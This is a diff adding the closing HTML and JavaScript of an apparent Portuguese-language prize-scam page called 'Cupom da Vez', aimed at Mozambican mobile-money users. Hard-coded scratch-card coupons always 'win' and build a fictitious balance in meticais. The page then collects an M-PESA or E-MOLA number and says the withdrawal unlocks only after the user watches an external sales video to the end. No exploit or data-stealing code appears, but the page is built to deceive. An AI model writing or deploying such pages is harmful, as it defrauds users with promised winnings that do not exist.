+        <div style="background-color: #ffffff; border: 2px solid #e5e7eb; border-radius: 1rem; padding: 1.5rem; margin-top: 1.5rem;">
+            <h3 style="font-size: 1.125rem; font-weight: bold; color: #000000; margin-bottom: 1rem;">Informações importantes:</h3>
+            <ul style="list-style: none; padding: 0;">
+                <li style="margin-bottom: 0.5rem; display: flex; align-items: start; gap: 0.5rem;">
+                    <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                    <span style="color: #4b5563;">Mantenha o som ativado durante o vídeo</span>
+                </li>
+                <li style="margin-bottom: 0.5rem; display: flex; align-items: start; gap: 0.5rem;">
+                    <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                    <span style="color: #4b5563;">Assista até o final para liberar o saque</span>
+                </li>
+                <li style="display: flex; align-items: start; gap: 0.5rem;">
+                    <span style="color: #10b981; margin-top: 0.25rem;">✓</span>
+                    <span style="color: #4b5563;">Não feche ou minimize a página</span>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>© 2025 Todos os direitos reservados - Cupom da Vez</p>
+    </div>
+</div>
+
+<script>
+// Global State
+let state = {
+    userName: '',
+    totalValue: 0,
+    currentCoupon: 1,
+    paymentMethod: 'emola',
+    coupons: [
+        {
+            id: 1,
+            product: 'Nike Air Force (Black)',
+            value: 850,
+            barcode: '96714954',
+            image: 'https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=600&q=80'
+        },
+        {
+            id: 2,
+            product: 'Nike Air Force (Rosa)',
+            value: 920,
+            barcode: '87526465',
+            image: 'https://images.unsplash.com/photo-1515955656352-a1fa3ffcd111?w=600&q=80'
+        },
+        {
+            id: 3,
+            product: 'JBL Caixa de Som',
+            value: 780,
+            barcode: '94141786',
+            image: 'https://images.unsplash.com/photo-1608043152269-423dbba4e7e1?w=600&q=80'
+        },
+        {
+            id: 4,
+            product: 'Nike Air Force (White)',
+            value: 1050,
+            barcode: '73892156',
+            image: 'https://images.unsplash.com/photo-1549298916-b41d501d3772?w=600&q=80'
+        },
+        {
+            id: 5,
+            product: 'Apple AirPods Pro',
+            value: 900,
+            barcode: '56289437',
+            image: 'https://images.unsplash.com/photo-1606841837239-c5a1a4a07af7?w=600&q=80'
+        },
+        {
+            id: 6,
+            product: 'Samsung Galaxy (Light Blue)',
+            value: 700,
+            barcode: '81795889',
+            image: 'https://images.unsplash.com/photo-1610945415295-d9bbf067e59c?w=600&q=80'
+        }
+    ]
+};
+
+// Page Navigation
+function goToPage(pageName) {
+    document.querySelectorAll('[id^="page-"]').forEach(page => {
+        page.classList.add('hidden');
+    });
+    document.getElementById('page-' + pageName).classList.remove('hidden');
+
+    if (pageName === 'coupon') {
+        initCouponPage();
+    } else if (pageName === 'limit') {
+        document.getElementById('limitTotalValue').textContent = state.totalValue.toLocaleString() + ' MTS';
+    } else if (pageName === 'withdraw') {
+        document.getElementById('withdrawTotalValue').textContent = 'MTS ' + state.totalValue.toLocaleString();
+    } else if (pageName === 'security') {
+        document.getElementById('securityTotalValue').textContent = state.totalValue.toLocaleString() + ' MTS';
+    } else if (pageName === 'video') {
+        document.getElementById('videoTotalValue').textContent = state.totalValue.toLocaleString();
+        loadVideoScript();
+    }
+}
+
+// Name Page
+function submitName(event) {
+    event.preventDefault();
+    const nameInput = document.getElementById('nameInput');
+    if (nameInput.value.trim()) {
+        state.userName = nameInput.value.trim();
+        document.getElementById('userName').textContent = state.userName;
+        goToPage('coupon');
+    }
+}
+
+// Coupon Page
+function initCouponPage() {
+    const coupon = state.coupons[state.currentCoupon - 1];
+
+    document.getElementById('totalValue').textContent = state.totalValue.toLocaleString();
+    document.getElementById('currentCouponNumber').textContent = state.currentCoupon;
+    document.getElementById('productImage').src = coupon.image;
+    document.getElementById('barcodeDisplay').textContent = coupon.barcode.match(/.{1,2}/g).join('-');
+    document.getElementById('productName').textContent = coupon.product;
+    document.getElementById('couponValue').textContent = coupon.value.toLocaleString();
+
+    updateProgressDots();
+    initScratchCard();
+
+    document.getElementById('scratchHint').classList.remove('hidden');
+    document.getElementById('couponForm').classList.add('hidden');
+    document.getElementById('couponCode').value = '';
+    document.getElementById('couponError').classList.add('hidden');
+
+    const couponCodeInput = document.getElementById('couponCode');
+    couponCodeInput.oninput = function() {
+        this.value = this.value.replace(/\D/g, '').slice(0, 8);
+        document.getElementById('validateBtn').disabled = this.value.length !== 8;
+        document.getElementById('couponError').classList.add('hidden');
+    };
+}
+
+function updateProgressDots() {
+    const dotsContainer = document.getElementById('progressDots');
+    dotsContainer.innerHTML = '';
+
+    for (let i = 1; i <= 6; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'dot ';
+        if (i < state.currentCoupon) {
+            dot.className += 'dot-active';
+        } else if (i === state.currentCoupon) {
+            dot.className += 'dot-current';
+        } else {
+            dot.className += 'dot-inactive';
+        }
+        dotsContainer.appendChild(dot);
+    }
+}
+
+// Scratch Card
+let scratchCanvas, scratchCtx, isScratching = false, hasRevealed = false, scratchPercentage = 0;
+
+function initScratchCard() {
+    scratchCanvas = document.getElementById('scratchCanvas');
+    scratchCtx = scratchCanvas.getContext('2d');
+    hasRevealed = false;
+    scratchPercentage = 0;
+
+    const rect = scratchCanvas.getBoundingClientRect();
+    scratchCanvas.width = rect.width * 2;
+    scratchCanvas.height = rect.height * 2;
+    scratchCtx.scale(2, 2);
+
+    const gradient = scratchCtx.createLinearGradient(0, 0, rect.width, rect.height);
+    gradient.addColorStop(0, '#9CA3AF');
+    gradient.addColorStop(0.5, '#D1D5DB');
+    gradient.addColorStop(1, '#9CA3AF');
+    scratchCtx.fillStyle = gradient;
+    scratchCtx.fillRect(0, 0, rect.width, rect.height);
+
+    scratchCtx.fillStyle = '#374151';
+    scratchCtx.font = 'bold 24px Arial';
+    scratchCtx.textAlign = 'center';
+    scratchCtx.textBaseline = 'middle';
+    scratchCtx.fillText('RASPE AQUI', rect.width / 2, rect.height / 2 - 10);
+
+    scratchCtx.font = '32px Arial';
+    scratchCtx.fillText('↑', rect.width / 2 - 40, rect.height / 2 + 30);
+    scratchCtx.fillText('↑', rect.width / 2, rect.height / 2 + 30);
+    scratchCtx.fillText('↑', rect.width / 2 + 40, rect.height / 2 + 30);
+
+    scratchCanvas.onmousedown = handleScratchStart;
+    scratchCanvas.onmousemove = handleScratchMove;
+    scratchCanvas.onmouseup = handleScratchEnd;
+    scratchCanvas.onmouseleave = handleScratchEnd;
+
+    scratchCanvas.ontouchstart = handleTouchStart;
+    scratchCanvas.ontouchmove = handleTouchMove;
+    scratchCanvas.ontouchend = handleScratchEnd;
+}
+
+function scratch(x, y) {
+    const rect = scratchCanvas.getBoundingClientRect();
+    const scaleX = scratchCanvas.width / rect.width;
+    const scaleY = scratchCanvas.height / rect.height;
+
+    scratchCtx.globalCompositeOperation = 'destination-out';
+    scratchCtx.beginPath();
+    scratchCtx.arc(
+        (x - rect.left) * scaleX,
+        (y - rect.top) * scaleY,
+        40,
+        0,
+        Math.PI * 2
+    );
+    scratchCtx.fill();
+
+    checkRevealPercentage();
+}
+
+function checkRevealPercentage() {
+    const imageData = scratchCtx.getImageData(0, 0, scratchCanvas.width, scratchCanvas.height);
+    const pixels = imageData.data;
+    let transparentPixels = 0;
+
+    for (let i = 3; i < pixels.length; i += 4) {
+        if (pixels[i] < 128) {
+            transparentPixels++;
+        }
+    }
+
+    scratchPercentage = (transparentPixels / (pixels.length / 4)) * 100;
+
+    if (scratchPercentage > 70) {
+        scratchCanvas.style.opacity = '0';
+        scratchCanvas.style.transition = 'opacity 0.5s ease-out';
+    }
+
+    if (scratchPercentage > 50 && !hasRevealed) {
+        hasRevealed = true;
+        revealCoupon();
+    }
+}
+
+function handleScratchStart(e) {
+    isScratching = true;
+    scratch(e.clientX, e.clientY);
+}
+
+function handleScratchMove(e) {
+    if (isScratching) {
+        scratch(e.clientX, e.clientY);
+    }
+}
+
+function handleScratchEnd() {
+    isScratching = false;
+}
+
+function handleTouchStart(e) {
+    e.preventDefault();
+    isScratching = true;
+    const touch = e.touches[0];
+    scratch(touch.clientX, touch.clientY);
+}
+
+function handleTouchMove(e) {
+    e.preventDefault();
+    if (isScratching) {
+        const touch = e.touches[0];
+        scratch(touch.clientX, touch.clientY);
+    }
+}
+
+function revealCoupon() {
+    document.getElementById('scratchHint').classList.add('hidden');
+    document.getElementById('couponForm').classList.remove('hidden');
+}
+
+function validateCoupon(event) {
+    event.preventDefault();
+    const code = document.getElementById('couponCode').value;
+    const coupon = state.coupons[state.currentCoupon - 1];
+
+    if (code === coupon.barcode) {
+        document.getElementById('couponError').classList.add('hidden');
+        showCelebration(coupon);
+    } else {
+        document.getElementById('couponError').textContent = 'Código incorreto! Verifique o código na imagem.';
+        document.getElementById('couponError').classList.remove('hidden');
+    }
+}
+
+// Celebration
+function showCelebration(coupon) {
+    document.getElementById('celebrationValue').textContent = coupon.value.toLocaleString() + ' MTS';
+    document.getElementById('celebrationProduct').textContent = coupon.product;
+    document.getElementById('celebration').classList.remove('hidden');
+
+    createMoneyFall();
+
+    setTimeout(() => {
+        document.getElementById('celebrationBtn').classList.remove('hidden');
+    }, 1500);
+}
+
+function createMoneyFall() {
+    const container = document.getElementById('moneyFall');
+    container.innerHTML = '';
+
+    for (let i = 0; i < 20; i++) {
+        const money = document.createElement('div');
+        money.className = 'money-falling';
+        money.textContent = '💰';
+        money.style.left = Math.random() * 100 + '%';
+        money.style.animationDelay = Math.random() * 2 + 's';
+        money.style.animationDuration = (3 + Math.random() * 2) + 's';
+        container.appendChild(money);
+    }
+}
+
+function continueCelebration() {
+    const coupon = state.coupons[state.currentCoupon - 1];
+    state.totalValue += coupon.value;
+
+    document.getElementById('celebration').classList.add('hidden');
+    document.getElementById('celebrationBtn').classList.add('hidden');
+
+    if (state.currentCoupon < 6) {
+        state.currentCoupon++;
+        initCouponPage();
+    } else {
+        goToPage('limit');
+    }
+}
+
+// Payment Selection
+function selectPayment(method) {
+    state.paymentMethod = method;
+
+    const mpesaBtn = document.getElementById('mpesaBtn');
+    const emolaBtn = document.getElementById('emolaBtn');
+    const phoneNumber = document.getElementById('phoneNumber');
+    const paymentLabel = document.getElementById('paymentLabel');
+    const phoneHint = document.getElementById('phoneHint');
+
+    if (method === 'mpesa') {
+        mpesaBtn.classList.add('selected-mpesa');
+        mpesaBtn.classList.remove('payment-btn');
+        emolaBtn.classList.remove('selected-emola');
+        emolaBtn.className = 'payment-btn';
+        phoneNumber.placeholder = '84xxxxxxxx ou 85xxxxxxxx';
+        paymentLabel.textContent = 'Número do M-PESA';
+        phoneHint.textContent = 'Digite o número iniciado com 84 ou 85 (9 dígitos)';
+    } else {
+        emolaBtn.classList.add('selected-emola');
+        emolaBtn.classList.remove('payment-btn');
+        mpesaBtn.classList.remove('selected-mpesa');
+        mpesaBtn.className = 'payment-btn';
+        phoneNumber.placeholder = '86xxxxxxxx ou 87xxxxxxxx';
+        paymentLabel.textContent = 'Número do E-MOLA';
+        phoneHint.textContent = 'Digite o número iniciado com 86 ou 87 (9 dígitos)';
+    }
+
+    phoneNumber.value = '';
+}
+
+// Withdraw Form
+document.getElementById('phoneNumber').oninput = function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 9);
+};
+
+function submitWithdraw(event) {
+    event.preventDefault();
+    const phoneNumber = document.getElementById('phoneNumber').value;
+
+    if (phoneNumber.length !== 9) {
+        alert('Por favor, digite um número válido com 9 dígitos.');
+        return;
+    }
+
+    const prefix = phoneNumber.substring(0, 2);
+
+    if (state.paymentMethod === 'emola') {
+        if (prefix !== '86' && prefix !== '87') {
+            alert('Número E-MOLA inválido! Deve começar com 86 ou 87.');
+            return;
+        }
+    } else if (state.paymentMethod === 'mpesa') {
+        if (prefix !== '84' && prefix !== '85') {
+            alert('Número M-PESA inválido! Deve começar com 84 ou 85.');
+            return;
+        }
+    }
+
+    goToPage('security');
+}
+
+// Video Script Loader
+function loadVideoScript() {
+    const existingScript = document.querySelector('script[src*="converteai.net"]');
+    if (!existingScript) {
+        const script = document.createElement('script');
+        script.src = 'https://scripts.converteai.net/9d93e4b2-3654-4bea-bda0-107c1328d520/players/6900f7e324bb6d6db57759eb/v4/player.js';
+        script.async = true;
+        document.head.appendChild(script);
+    }
+}
+
+// Initialize
+goToPage('welcome');
+</script>
+
 </body>
 </html>
